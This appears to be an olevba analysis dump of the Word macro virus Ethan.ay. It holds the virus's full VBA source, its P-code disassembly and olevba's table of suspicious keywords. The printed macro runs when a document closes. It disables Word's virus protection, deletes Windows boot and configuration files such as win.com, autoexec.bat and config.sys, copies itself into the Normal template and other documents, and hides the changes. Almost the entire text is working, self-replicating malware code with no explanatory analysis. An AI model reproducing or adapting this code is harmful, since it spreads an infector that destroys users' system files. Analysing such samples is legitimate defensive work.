olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.ay
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.ay - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
ADS = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Dir("MSDOS.PRV", 6) = "" Then
Open "MSDOS.PRV" For Output As #1
For iLoop = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CodeLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(iLoop, 1)
Print #1, CodeLine
Next iLoop
Close #1
SetAttr "MSDOS.PRV", 6
End If
If Dir("\windows\win.com") <> "" Then Kill "\windows\win.com"
If Dir("\windows\win.ini") <> "" Then Kill "\windows\win.ini"
If Dir("\autoexec.bat") <> "" Then Kill "\autoexec.bat"
If Dir("\config.sys") <> "" Then Kill "\config.sys"
If Dir("\windows\class.sys") <> "" Then Kill "\windows\class.sys"
If Dir("\class.sys") <> "" Then Kill "\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set TheItem = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set TheItem = ActiveDocument.VBProject.VBComponents.Item(1)
Else
TheItem = ""
End If
If TheItem <> "" Then
Open "MSDOS.PRV" For Input As #1
If LOF(1) = 0 Then GoTo Fin
Count = 1
Do While Not EOF(1)
Line Input #1, CodeLine
TheItem.CodeModule.InsertLines Count, CodeLine
Count = Count + 1
Loop
Fin:
Close #1
With Dialogs(wdDialogFileSummaryInfo): .Title = "OOPS": .Author = "Billy McGrop": .Keywords = "To Vile": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> ADS Then ActiveDocument.Saved = ADS
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.ay
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3698 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St ADS 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	LitStr 0x0009 "MSDOS.PRV"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #6:
' 	LitStr 0x0009 "MSDOS.PRV"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #7:
' 	StartForVariable 
' 	Ld iLoop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #8:
' 	Ld iLoop 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CodeLine 
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld CodeLine 
' 	PrintItemNL 
' Line #10:
' 	StartForVariable 
' 	Ld iLoop 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #12:
' 	LitStr 0x0009 "MSDOS.PRV"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0010 "\windows\win.com"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "\windows\win.com"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #15:
' 	LitStr 0x0010 "\windows\win.ini"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "\windows\win.ini"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #16:
' 	LitStr 0x000D "\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "\autoexec.bat"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #17:
' 	LitStr 0x000B "\config.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "\config.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #18:
' 	LitStr 0x0012 "\windows\class.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "\windows\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #19:
' 	LitStr 0x000A "\class.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set TheItem 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set TheItem 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	LitStr 0x0000 ""
' 	St TheItem 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld TheItem 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0009 "MSDOS.PRV"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Fin 
' 	EndIf 
' Line #30:
' 	LitDI2 0x0001 
' 	St Count 
' Line #31:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld CodeLine 
' 	LineInput 
' Line #33:
' 	Ld Count 
' 	Ld CodeLine 
' 	Ld TheItem 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #35:
' 	Loop 
' Line #36:
' 	Label Fin 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0004 "OOPS"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x000C "Billy McGrop"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0007 "To Vile"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld ADS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ADS 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #42:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

